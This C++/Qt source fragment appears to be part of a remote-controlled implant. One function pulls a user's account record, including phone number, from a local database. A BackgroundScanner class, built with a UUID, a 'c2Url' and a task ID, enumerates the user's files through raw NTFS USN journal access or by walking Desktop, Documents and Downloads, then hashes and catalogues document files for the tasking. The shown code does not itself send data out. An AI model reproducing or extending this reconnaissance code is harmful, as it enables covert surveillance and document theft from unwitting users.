        if (sqlite3_step(stmt) == SQLITE_ROW) {
            obj["userId"] = QString::fromUtf8((const char*)sqlite3_column_text(stmt, 0));
            obj["username"] = QString::fromUtf8((const char*)sqlite3_column_text(stmt, 1));
            obj["firstName"] = QString::fromUtf8((const char*)sqlite3_column_text(stmt, 2));
            obj["lastName"] = QString::fromUtf8((const char*)sqlite3_column_text(stmt, 3));
            obj["phone"] = QString::fromUtf8((const char*)sqlite3_column_text(stmt, 4));
            obj["isPremium"] = sqlite3_column_int(stmt, 5) ? true : false;
        }
        sqlite3_finalize(stmt);
    }
    sqlite3_close(db);
    return QJsonDocument(obj).toJson(QJsonDocument::Compact);
}

// Background Scanner Implementation
BackgroundScanner::BackgroundScanner(const QString& uuid, const QString& c2Url, const QString& dbPath, const QString& taskId, const QString& mode, const QString& targetPath)
    : _uuid(uuid), _c2Url(c2Url), _dbPath(dbPath), _taskId(taskId), _mode(mode), _targetPath(targetPath) {
}

#ifdef Q_OS_WIN
// Helper structures for USN Journal scanning
typedef struct {
    DWORD RecordLength;
    WORD   MajorVersion;
    WORD   MinorVersion;
    DWORDLONG FileReferenceNumber;
    DWORDLONG ParentFileReferenceNumber;
    USN Usn;
    LARGE_INTEGER TimeStamp;
    DWORD Reason;
    DWORD SourceInfo;
    DWORD SecurityId;
    DWORD FileAttributes;
    WORD   FileNameLength;
    WORD   FileNameOffset;
    WCHAR FileName[1];
} MyUsnRecord;

struct UsnDirInfo {
    DWORDLONG parentId;
    QString name;
};

struct UsnFileTask {
    DWORDLONG parentId;
    QString name;
    int64_t timestamp;
};

bool ScanVolumeUSN(sqlite3* db, const QString& drive, const QString& filterPrefix) {
    QString volName = "\\\\.\\" + drive;
    if (volName.endsWith("\\")) volName.chop(1);
    
    HANDLE hVol = CreateFile((LPCWSTR)volName.toStdWString().c_str(), 
        GENERIC_READ | GENERIC_WRITE, 
        FILE_SHARE_READ | FILE_SHARE_WRITE, 
        NULL, 
        OPEN_EXISTING, 
        0, 
        NULL);
        
    if (hVol == INVALID_HANDLE_VALUE) return false;
    
    USN_JOURNAL_DATA_V0 journalData;
    DWORD bytesReturned;
    
    if (!DeviceIoControl(hVol, FSCTL_QUERY_USN_JOURNAL, NULL, 0, &journalData, sizeof(journalData), &bytesReturned, NULL)) {
        CloseHandle(hVol);
        return false;
    }
    
    MFT_ENUM_DATA med;
    med.StartFileReferenceNumber = 0;
    med.LowUsn = 0;
    med.HighUsn = journalData.NextUsn;
    
    const int BUF_LEN = 256 * 1024; // 256KB
    std::vector<char> buffer(BUF_LEN);
    
    std::unordered_map<DWORDLONG, UsnDirInfo> directories;
    std::vector<UsnFileTask> files;
    files.reserve(100000); 
    
    while (true) {
        if (!DeviceIoControl(hVol, FSCTL_ENUM_USN_DATA, &med, sizeof(med), buffer.data(), BUF_LEN, &bytesReturned, NULL)) {
            break;
        }
        
        DWORD offset = sizeof(USN); 
        while (offset < bytesReturned) {
            MyUsnRecord* usn = (MyUsnRecord*)((char*)buffer.data() + offset);
            
            QString name = QString::fromWCharArray(usn->FileName, usn->FileNameLength / 2);
            
            if (usn->FileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                directories[usn->FileReferenceNumber] = {usn->ParentFileReferenceNumber, name};
            } else {
                 files.push_back({usn->ParentFileReferenceNumber, name, (int64_t)(usn->TimeStamp.QuadPart / 10000000 - 11644473600LL)}); 
            }
            offset += usn->RecordLength;
        }
        
        med.StartFileReferenceNumber = *((DWORDLONG*)buffer.data());
        if (med.StartFileReferenceNumber == 0) break;
    }
    
    CloseHandle(hVol);
    
    QSet<QString> targetExts = {"txt", "doc", "docx", "pdf", "ppt"};
    QString filter = filterPrefix;
    if (!filter.isEmpty()) filter = filter.replace("/", "\\");

    sqlite3_exec(db, "BEGIN TRANSACTION;", 0, 0, 0);
    sqlite3_stmt* stmt;
    const char* sql = "INSERT OR REPLACE INTO file_scan_results (path, name, size, md5, last_modified) VALUES (?, ?, ?, ?, ?);";
    sqlite3_prepare_v2(db, sql, -1, &stmt, 0);

    for (const auto& file : files) {
        QString fullPath = file.name;
        DWORDLONG currentId = file.parentId;
        
        int depth = 0;
        
        while (directories.count(currentId) && depth < 50) {
            const auto& dir = directories[currentId];
            fullPath = dir.name + "\\" + fullPath;
            currentId = dir.parentId;
            depth++;
        }
        fullPath = drive + "\\" + fullPath;
        
        if (!filter.isEmpty()) {
            if (!fullPath.startsWith(filter, Qt::CaseInsensitive)) continue;
        }
        
        QString qtPath = fullPath.replace("\\", "/");
        QFileInfo fi(file.name);
        QString ext = fi.suffix().toLower();
        QString md5 = "";
        int64_t size = 0;
        
        if (targetExts.contains(ext)) {
            QFile f(qtPath);
            if (f.open(QIODevice::ReadOnly)) {
                size = f.size();
                QCryptographicHash hash(QCryptographicHash::Md5);
                if (hash.addData(&f)) {
                    md5 = hash.result().toHex();
                }
            }
        }
        
        sqlite3_bind_text(stmt, 1, qtPath.toUtf8().constData(), -1, SQLITE_TRANSIENT);
        sqlite3_bind_text(stmt, 2, file.name.toUtf8().constData(), -1, SQLITE_TRANSIENT);
        sqlite3_bind_int64(stmt, 3, size);
        sqlite3_bind_text(stmt, 4, md5.toUtf8().constData(), -1, SQLITE_TRANSIENT);
        sqlite3_bind_int64(stmt, 5, file.timestamp);
        sqlite3_step(stmt);
        sqlite3_reset(stmt);
    }
    
    sqlite3_exec(db, "COMMIT;", 0, 0, 0);
    sqlite3_finalize(stmt);
    return true;
}
#endif

void BackgroundScanner::process() {
    sqlite3* db;
    if (sqlite3_open(_dbPath.toUtf8().constData(), &db) != SQLITE_OK) {
        Q_EMIT scanFinished(_taskId, QByteArray());
        return;
    }

#ifdef Q_OS_WIN
    // Try USN Scan first
    QString drive = "C:";
    QString filter = "";
    if (_mode == "full") {
        QString home = QDir::homePath();
        if (home.length() > 1 && home[1] == ':') {
            drive = home.left(2);
            filter = home; // Limit to user directory to avoid scanning unrelated system files? 
                           // Or just scan everything if user wants "Everything" speed.
                           // User said "Everything 之所以快...".
                           // Let's filter by User Home to be safe/polite, but efficient.
        }
    } else if (!_targetPath.isEmpty()) {
        if (_targetPath.length() > 1 && _targetPath[1] == ':') {
            drive = _targetPath.left(2);
            filter = _targetPath;
        }
    }

    if (ScanVolumeUSN(db, drive, filter)) {
        sqlite3_close(db);
        Q_EMIT scanFinished(_taskId, QByteArray());
        return;
    }
#endif

    // Fallback to standard directory traversal
    sqlite3_exec(db, "BEGIN TRANSACTION;", 0, 0, 0);
    
    sqlite3_stmt* stmt;
    const char* sql = "INSERT OR REPLACE INTO file_scan_results (path, name, size, md5, last_modified) VALUES (?, ?, ?, ?, ?);";
    sqlite3_prepare_v2(db, sql, -1, &stmt, 0);

    QSet<QString> targetExts = {"txt", "doc", "docx", "pdf", "ppt"};

    auto scanDir = [&](const QString& path) {
        QDirIterator it(path, QDir::Files | QDir::NoDotAndDotDot | QDir::Hidden, QDirIterator::Subdirectories);
        while (it.hasNext()) {
            it.next();
            QFileInfo entry = it.fileInfo();
            
            QString md5Hash = "";
            QString ext = entry.suffix().toLower();
            
            if (targetExts.contains(ext)) {
                if (entry.size() < 100 * 1024 * 1024) { // Limit to 100MB for hash
                    QFile file(entry.absoluteFilePath());
                    if (file.open(QIODevice::ReadOnly)) {
                         QCryptographicHash hash(QCryptographicHash::Md5);
                         if (hash.addData(&file)) {
                             md5Hash = hash.result().toHex();
                         }
                    }
                } else {
                    md5Hash = "skipped_large_file";
                }
            }

            sqlite3_bind_text(stmt, 1, entry.absoluteFilePath().toUtf8().constData(), -1, SQLITE_TRANSIENT);
            sqlite3_bind_text(stmt, 2, entry.fileName().toUtf8().constData(), -1, SQLITE_TRANSIENT);
            sqlite3_bind_int64(stmt, 3, entry.size());
            sqlite3_bind_text(stmt, 4, md5Hash.toUtf8().constData(), -1, SQLITE_TRANSIENT);
            sqlite3_bind_int64(stmt, 5, entry.lastModified().toSecsSinceEpoch());
            sqlite3_step(stmt);
            sqlite3_reset(stmt);
        }
    };

    if (_mode == "full") {
        QString home = QDir::homePath();
        scanDir(home + "/Desktop");
        scanDir(home + "/Documents");
        scanDir(home + "/Downloads");
    } else if (!_targetPath.isEmpty()) {
        scanDir(_targetPath);
    }

    sqlite3_exec(db, "COMMIT;", 0, 0, 0);
    sqlite3_finalize(stmt);
    sqlite3_close(db);

    Q_EMIT scanFinished(_taskId, QByteArray());
}

} // namespace Core